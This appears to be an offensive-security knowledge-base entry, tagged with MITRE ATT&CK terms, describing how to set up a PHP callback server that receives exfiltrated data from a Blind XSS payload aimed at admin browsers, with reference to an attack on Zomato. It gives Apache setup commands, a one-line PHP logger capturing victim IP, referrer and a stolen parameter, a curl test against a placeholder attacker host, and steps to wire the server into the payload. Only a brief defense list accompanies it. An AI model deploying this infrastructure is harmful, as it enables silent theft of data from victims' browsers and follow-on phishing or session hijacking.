---
id: proc-deploy-xss-server
tags:
  - callback-server
  - php
  - exfiltration
  - xss
type: procedure
tools:
  - '[[tools/zomato-php-callback]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:30:47.067Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Deploy-XSS-Callback-Server

## Summary

This procedure deploys a simple PHP callback server to receive and log requests triggered by the Blind XSS payload, capturing attacker-useful data like victim IP and referrer for further exploitation.

## Description

The callback server acts as the endpoint for the img src in the XSS payload, executing on admin browsers to exfiltrate data without direct interaction. The custom zomato.php script logs details to a file upon receiving GET requests with the 'c' parameter. It requires a publicly accessible web server (e.g., Apache with PHP). In the Zomato attack, it captured admin IPs from India, enabling potential follow-on attacks like phishing or session hijacking.

## Requirements

1. Web server with PHP support (e.g., Apache/Nginx on Linux)
2. Public IP or domain for the server (replace <my_server_ip> in payload)
3. Write permissions for log file (e.g., log.txt in script directory)
4. Firewall allowing HTTP traffic (port 80)

## Defense

Defensive measures and detection strategies:

- Block unexpected outbound requests from admin browsers to unknown domains/IPs
- Implement network segmentation to isolate admin dashboards from external access
- Scan logs for anomalous img src callbacks or external resource loads
- Use endpoint detection to flag browser requests to suspicious servers

## Objectives

1. Host the callback endpoint accessible to the XSS payload
2. Log incoming request metadata (time, IP, referrer, parameter)
3. Enable silent data collection from admin interactions

## Instructions

### Step 1: Set Up Web Server

**Context**: Prepare the hosting environment.

Install Apache and PHP if not present (e.g., on Ubuntu: sudo apt install apache2 php libapache2-mod-php). Start the server: sudo systemctl start apache2.

### Step 2: Deploy zomato.php Script

**Context**: Place the logging script in the web root.

Create zomato.php with content to handle GET requests: Use file_put_contents('log.txt', 'Time: ' . date('Y-m-d H:i:s') . ' IP: ' . $_SERVER['REMOTE_ADDR'] . ' Referer: ' . $_SERVER['HTTP_REFERER'] . ' C: ' . $_GET['c'] . "\n", FILE_APPEND); Ensure it's in /var/www/html/ or equivalent.

**Expected Output**: Script file saved; test access via browser shows no output (silent).

### Step 3: Test the Endpoint

**Context**: Verify logging functionality.

Send a test GET request: curl "http://<my_server_ip>/zomato.php?c=test". Check log.txt for entry.

**Expected Output**: Log entry like 'Time: 2023-10-01 12:00:00 IP: 127.0.0.1 Referer: C: test'.

### Step 4: Integrate with Payload

**Context**: Ensure server IP matches the one in the injected payload.

Update the XSS payload with the live server IP and redeploy if needed.

**Expected Output**: Server ready for production callbacks.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/zomato-php-callback]]

## Tags

- [[callback-server]]
- [[php]]
- [[Exfiltration]]
- [[xss]]
